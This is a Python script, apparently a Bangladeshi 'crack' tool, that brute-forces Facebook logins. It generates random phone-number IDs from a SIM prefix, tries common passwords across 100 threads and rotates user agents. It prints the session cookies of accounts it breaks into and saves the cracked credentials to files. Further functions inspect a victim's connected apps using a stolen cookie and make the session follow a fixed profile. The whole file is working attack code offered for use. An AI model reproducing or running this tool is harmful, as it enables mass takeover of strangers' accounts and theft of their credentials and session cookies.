import os,sys,time,json,random,re,string,platform,base64,uuid

from bs4 import BeautifulSoup as sop

from bs4 import BeautifulSoup

import requests as ress

from datetime import date

from datetime import datetime

from time import sleep

from os import system as s

from time import sleep as waktu

try:

    import requests

    from concurrent.futures import ThreadPoolExecutor as ThreadPool

    import mechanize

    from requests.exceptions import ConnectionError

except ModuleNotFoundError:

    os.system('pip install mechanize requests futures bs4==2 > /dev/null')

    os.system('pip install bs4')

    

    

import os

try:

    import requests

except ImportError:

    print('\n [✓] installing requests !...\n')

    os.system('pip install requests')

try:

    import concurrent.futures

except ImportError:

    print('\n [✓] installing futures !...\n')

    os.system('pip install futures')

try:

    import bs4

except ImportError:

    print('\n [✓] installing bs4 !...\n')

    os.system('pip install bs4')

def cek_apk(session,coki):

    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text

    sop = BeautifulSoup(w,"html.parser")

    x = sop.find("form",method="post")

    game = [i.text for i in x.find_all("h3")]

    if len(game)==0:

        print(f'\r%s[%s!%s] %sSorry there is no Active  Apk%s  '%(N,M,N,M,N))

    else:

        print(f'\r[ðŸŽ®] %s \x1b[1;95m â˜† Your Active Apps â˜†     :{WHITE}'%(GREEN))

        for i in range(len(game)):

            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))

        #else:

            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))

    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text

    sop = BeautifulSoup(w,"html.parser")

    x = sop.find("form",method="post")

    game = [i.text for i in x.find_all("h3")]

    if len(game)==0:

        print(f'\r%s[%s!%s] %sSorry there is no Expired Apk%s           \n'%(N,M,N,M,N))

    else:

        print(f'\r[ðŸŽ®] %s \x1b[1;95m â—‡ Your Expired Apps â—‡    :{WHITE}'%(M))

        for i in range(len(game)):

            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))

        else:

            print('')

 

def follow(self, session, coki):

        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100015315258519', {

            'cookie': coki }, **('cookies',)).text, 'html.parser')

        get = r.find('a', 'Ikuti', **('string',)).get('href')

        session.get('https://mbasic.facebook.com' + str(get), {

            'cookie': coki }, **('cookies',)).text

            

            

 

class jalan:

    def __init__(self, z):

        for e in z + "\n":

            sys.stdout.write(e)

            sys.stdout.flush()

            time.sleep(0.0009)

RED = '\033[1;91m'

WHITE = '\033[1;97m'

GREEN = '\033[1;32m' #

YELLOW = '\033[1;33m'

BLUE = '\033[1;34m'

ORANGE = '\033[1;35m'

P = '\x1b[1;97m' # PUTIH

M = '\x1b[1;91m' # MERAH

H = '\x1b[1;92m' # HIJAU

K = '\x1b[1;93m' # KUNING

B = '\x1b[1;94m' # BIRU

U = '\x1b[1;95m' # UNGU

O = '\x1b[1;96m' # BIRU MUDA

N = '\x1b[0m'    # WARNA MATI

A = '\x1b[1;90m' # WARNA ABU ABU

BN = '\x1b[1;107m' # BELAKANG PUTIH

BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT

BP = '\x1b[1;105m' # BELAKANG PINK

BB = '\x1b[1;104m' # BELAKANG BIRU

BK = '\x1b[1;103m' # BELAKANG KUNING

BH = '\x1b[1;102m' # BELAKANG HIJAU

BM = '\x1b[1;101m' # BELAJANG MERAH

BA = '\x1b[1;100m' # BELAKANG ABU ABU

now = datetime.now()

dt_string = now.strftime("%H:%M")

current = datetime.now()

ta = current.year

bu = current.month

ha = current.day

today = date.today() 

loop = 0

oks = []

cps = []

ugen2=[]

ugen=['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.57','Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:110.0) Gecko/20100101 Firefox/110.0','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Vivaldi/5.7.2921.60','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Vivaldi/5.7.2921.60','Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.153 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 13; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.153 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 13; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.153 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 13; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.153 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 13; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.153 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 13; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.153 Mobile Safari/537.36','Mozilla/5.0 (Android 13; Mobile; rv:68.0) Gecko/68.0 Firefox/110.0','Mozilla/5.0 (Android 13; Mobile; LG-M255; rv:110.0) Gecko/110.0 Firefox/110.0','Mozilla/5.0 (iPhone; CPU iPhone OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1','Mozilla/5.0 (iPhone; CPU iPhone OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/110.0.5481.114 Mobile/15E148 Safari/604.1','Mozilla/5.0 (iPhone; CPU iPhone OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/110.0 Mobile/15E148 Safari/605.1.15','Mozilla/5.0 (Symbian/3; Series60/5.3 NokiaX7-00/111.040.1511; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/8.3.1.4 Mobile Safari/535.1 3gpp-gba','Mozilla/5.0 (Symbian/3; Series60/5.4 Nokia700/112.010.1404; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/8.2.1.20 Mobile Safari/535.1 3gpp-gba','Nokia603/112.010.1404 (Symbian/3; Series60/5.4 Mozilla/5.0; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 NokiaBrowser/8.2.1.20 3gpp-gba','Mozilla/5.0 (Symbian/3; Series60/5.3 NokiaN8-00/111.040.1514; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/8.3.1.4 Mobile Safari/535.1 3gpp-gba','Mozilla/5.0 (MeeGo; NokiaN9) AppleWebKit/534.13 (KHTML, like Gecko) NokiaBrowser/8.5.0 Mobile Safari/534.13(Linux LLC B47)','Mozilla/5.0 (Symbian/3; Series60/5.5 Nokia808PureView/113.010.1507; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML like Gecko) NokiaBrowser/8.3.2.21 Mobile Safari/535.1 3gpp-gba','Mozilla/5.0 (Symbian/3; Series60/5.5 Nokia-603/113.010.1506; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1(KHTML, like Gecko) NokiaBrowser/8.3.2.21 Mobile Safari/535.1 3gpp-gba','Mozilla/5.0 (Symbian/3; Series60/5.4 Nokia808PureView/112.010.1506; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/8.2.1.21 Mobile Safari/535.1 3gpp-gba','Mozilla/5.0 (MeeGo; NokiaN9) AppleWebKit/5.1.34.13 (KHTML, like Gecko) NokiaBrowser/8.5.0 Mobile Safari/534.13 PHLolsec/1.3.0','Mozilla/5.0 (MeeGo; NokiaN9) AppleWebKit/534.13 (KHTML, like Gecko) NokiaBrowser/8.5.0 Mobile Safari/534.13 Edg/105.0.0.0','Mozilla/5.0 (Symbian/3; Series60/5.3 NokiaC7-00/111.040.1511; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML like Gecko) NokiaBrowser/8.3.1.4 Mobile Safari/535.1 3gpp-gba','Mozilla/5.0 (Symbian/3; KAIOS 2.5 NokiaN8-00/111.040.1511; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/8.3.1.4 Mobile Safari/535.1 3gpp-gba','Symbian Mozilla/5.0 (Symbian/3; Series60/5.3 NokiaE7-00/111.040.1511; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/8.3.1.4 Mobile Safari/535.1','Mozilla/5.0 (MeeGo; NokiaN9) AppleWebKit/534.13 (KHTML, like Gecko)NokiaBrowser/8.5.0 Mobile Safari/534.13','Mozilla/5.0 (Macintosh; Intel Mac OS X 13_2_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15','Mozilla/5.0 (iPhone; CPU iPhone OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1','Mozilla/5.0 (iPad; CPU OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1','Mozilla/5.0 (iPod touch; CPU iPhone 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1','Mozilla/5.0 (Linux; Android 11; 220233L2G Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.85 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/395.0.0.27.214;]','Mozilla/5.0 (Linux; Android 11; 220233L2G Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.91 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/392.2.0.33.108;]','Mozilla/5.0 (Linux; Android 11; 220233L2G Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/378.0.0.18.112;]','Mozilla/5.0 (Linux; Android 11; 220233L2G Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/390.0.0.27.105;]','Mozilla/5.0 (Linux; Android 11; 220233L2I Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.79 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; Redmi 8 Build/QKQ1.191014.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.117 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/401.0.0.24.77;]','Mozilla/5.0 (Linux; Android 10; Redmi 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.97 Mobile Safari/537.36 OPR/71.3.3718.67322','Mozilla/5.0 (Linux; Android 10; Redmi 8 Build/QKQ1.191014.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.120 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/217.0.0.14.121;]','Mozilla/5.0 (Linux; Android 8.1.0; Redmi 4 Prime) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 9; Redmi 4 Prime) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.1.0; Redmi 4 Prime Build/OPM6.171019.030.K1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.123 Mobile Safari/537.36 EdgA/42.0.0.2314','Mozilla/5.0 (Linux; arm_64; Android 8.1.0; Redmi 4 Prime) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 YaBrowser/19.12.4.87.00 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.1.0; Redmi 4 Prime Build/OPM1.171019.019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.138 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4 Prime Build/NJH47F) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/63.0.3239.111 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4 Prime Build/NJH47B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.85 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.1.0; Redmi 4 Prime) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 9; PMT4238_4G_EEA) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36','Mozilla/5.0 (Linux; Android 9; TX6s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5525.195 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 11; V2056A; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/13.9.0.0','Mozilla/5.0 (Linux; Android 9; SM-A207M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5519.212 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 4.2.2; hu-HU; GT-S7582 Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.10.0.1163 UCTurbo/1.10.9.900 Mobile Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 13.2; rv:110.0) Gecko/20100101 Firefox/110.0','Mozilla/5.0 (X11; Linux x86_64; rv:110.0) Gecko/20100101 Firefox/110.0']

cokbrut=[]

ses=requests.Session()

princp=[]

ugen=[]

uas=[]

usa = ["Mozilla/5.0 Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))} (KHTML, like Gecko) Version/{str(rr(20,100))}.0.{str(rr(1111,9999))} Safari/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))}"]

rr = random.randint

for xd in range(3005):

    ff=(f'Mozilla/5.0 Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))} (KHTML, like Gecko) Version/{str(rr(20,100))}.0.{str(rr(1111,9999))} Safari/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))}')

    uas.append(ff)

for sat in range(1000):

    a='Redmi'

    b=random.randrange(1,9)

    c='-0'

    d=random.randrange(1,9)

    e='/'

    f=random.randrange(1,9)

    g='.0 ('

    h=random.randrange(1,12)

    i='Profile/MIDP-2.1 Configuration/CLDC-1.1'

    j='UNTRUSTED/'

    k=random.randrange(1,3)

    l='.0'

    uaku2=f'{a}{b}{c}{d}{e}{f}{g}{h}{i}{j}{k}{l}'

    ugen.append(uaku2)

    

nka = [

"NokiaX2-02/8.0 (11.57) Profile/MIDP-2.1 Configuration/CLDC-1.1",

"NokiaX4-01/5.0 (08.65) Profile/MIDP-2.1 Configuration/CLDC-1.1 UNTRUSTED/1.0",

"nokia6610I/1.0 (4.10) Profile/MIDP-1.0 Configuration/CLDC-1.0 (FAST WAP Proxy/1.0)",

]            

logo= ("""

╭━╮╭━╮╭━━━╮╱╱╭━━━╮╭━━━╮╭━╮╭━╮╭━━╮╭━━━╮

┃┃╰╯┃┃┃╭━╮┃╱╱┃╭━╮┃┃╭━╮┃┃┃╰╯┃┃╰┫┣╯┃╭━╮┃

┃╭╮╭╮┃┃╰━╯┃╱╱┃╰━━╮┃┃╱┃┃┃╭╮╭╮┃╱┃┃╱┃╰━╯┃

┃┃┃┃┃┃┃╭╮╭╯╱╱╰━━╮┃┃╰━╯┃┃┃┃┃┃┃╱┃┃╱┃╭╮╭╯

┃┃┃┃┃┃┃┃┃╰╮╭╮┃╰━╯┃┃╭━╮┃┃┃┃┃┃┃╭┫┣╮┃┃┃╰╮

╰╯╰╯╰╯╰╯╰━╯╰╯╰━━━╯╰╯╱╰╯╰╯╰╯╰╯╰━━╯╰╯╰━╯

\033[1;91m--------------------------------------------

\033[1;91m[✓] CREATOR   > Anik 

\033[1;91m[✓] FACEBOOK  > Anik Mackfild 

\033[1;91m[✓] GITHUB    > Fuck****

\033[1;91m[✓] VERSION   > FREE

\033[1;91m[✓] WHATSAPP  > 01617350448

\033[1;91m--------------------------------------------""")

A = '\x1b[1;97m' 

B = '\x1b[1;96m' 

C = '\x1b[1;91m' 

D = '\033[38;5;46m'

M = '\033[1;31m'

H = '\033[38;5;46m'

N = '\x1b[1;37m'    

E = '\x1b[1;93m' 

F = '\x1b[1;94m'

G = '\x1b[1;95m'

P = '\033[1;37m'

def v2():

    user=[]

    os.system('clear')

    os.system('xdg-open fb://group/1885398221816745?ref=share&mibextid=NSMWBT')

    print(logo)

    print('[+] SIM CODE BD=> 016•017•018•019')

    kode = input('\033[1;32m[\033[1;32m?\033[1;32m] SIM CODE : ')

    kodex = ''.join(random.choice(string.digits) for _ in range(2))

    kod = ''.join(random.choice(string.digits) for _ in range(2))

    print('[+] 2000•5000•10000•15000•50000')

    limit = int(input('[?] ENTER YOUR CRACK LIMIT : '))

    for nmbr in range(limit):

        nmp = ''.join(random.choice(string.digits) for _ in range(4))

        user.append(nmp)

    with ThreadPool(max_workers=100) as akash:

        os.system('clear')

        print(logo)

        tl = str(len(user))

        print('\033[1;37m[\033[1;32m✓\033[1;32m] SIM CODE : '+kode)

        print('\033[1;37m[\033[1;32m✓\033[1;32m] SOME ID,S WAS LOCKED ')

        print('\033[1;37m[\033[1;32m✓\033[1;32m] TOOL CREATED BY SAMIR ')

        print('\033[1;37m[\033[1;32m✓\033[1;32m] TOTAL ID : '+tl)

        print('\033[1;32m─────────────────────────────────────────────────────────')

        for guru in user:

            uid = kode+kodex+kod+guru

            pwx = [kode+kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,'bangladesh','Bangladesh','fflover','iloveyou','freefire']

            akash.submit(rcrack1,uid,pwx,tl)

    print('\033[1;32m─────────────────────────────────────────────────────────')

    print('\033[1;37m[\033[1;32m~\033[1;37m] CRACK SUCCESSFULLY COMPLETED..')

    print('\033[1;32m─────────────────────────────────────────────────────────')

def rcrack1(uid,pwx,tl):

    global loop

    global cps

    global oks

    global proxy

    try:

        for ps in pwx:

            pro = random.choice(ugen)

            session = requests.Session()

            bi = random.choice([A,B,C,D,E,F,G,H])

            sys.stdout.write(f'\r \033[1;31m[%sANIK-XD_KING\033[1;31m]\033[1;34m\033[1;31m[\033[38;5;195m%s/%s\033[1;31m]\033[1;34m\033[38;5;45mOK-\033[38;5;46m%s\r'%(bi,loop,tl,len(oks))),

            sys.stdout.flush()

            free_fb = session.get('https://m.facebook.com/login/?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2F&refsrc=deprecated&_rdr').text

            log_data = {

                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),

            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),

            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),

            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),

            "try_number":"0",

            "unrecognized_tries":"0",

            "email":uid,

            "pass":ps,

            "login":"Log In"}

            header_freefb = {'authority': 'm.facebook.com',

            "method": 'POST',

            'path':'/login/?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2F&refsrc=deprecated&_rdr',

            "scheme": 'https',

             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',

             'accept-language': 'en-IN,en;q=0.9,ur-PK;q=0.8,ur;q=0.7,bn-BD;q=0.6,bn;q=0.5,ur-IN;q=0.4,en-BE;q=0.3,hi-IN;q=0.2,hi;q=0.1,en-ER;q=0.1,en-GB;q=0.1,en-US;q=0.1',

             'cache-control': 'max-age=0',

             'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',

             'sec-ch-ua-mobile': '?1',

             'sec-ch-ua-platform': '"Android"',

             'sec-fetch-dest': 'document',

             'sec-fetch-mode': 'navigate',

             'sec-fetch-site': 'none',

             'sec-fetch-user': '?1',

             'upgrade-insecure-requests': '1',

             'user-agent': pro,}

            lo = session.post('https://m.facebook.com/login/device-based/regular/login/?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2F&amp;refsrc=deprecated&amp;lwv=100',data=log_data,headers=header_freefb).text

            log_cookies=session.cookies.get_dict().keys()

            if 'c_user' in log_cookies:

                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])

                cid = coki[65:80]

                print(f"\033[38;5;46m[ANIK-XD-OK] {uid} • {ps}" '  \n\033[1;33m [💉]\033[1;33mCookie = \033[1;32m'+coki+  ' \n\033[1;33m [🍎] \033[1;32mUa = \033[1;34m'+pro+'  \033[0;97m')

                open('/sdcard/ANIK-XD-OK.txt', 'a').write( uid+' | '+ps+'\n')

                oks.append(uid)

                break

            elif 'checkpoint' in log_cookies:

                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])

                cid = coki[82:97]

                print(f"\x1b[38;5;196m[ANIK-XD-CP] {uid} • {ps}")

                open('/sdcard/ANIK-XD-CP.txt', 'a').write( uid+' | '+ps+' \n')

                cps.append(uid)

                break

            else:

                continue

        loop+=1

        

    except:

        pass

v2()
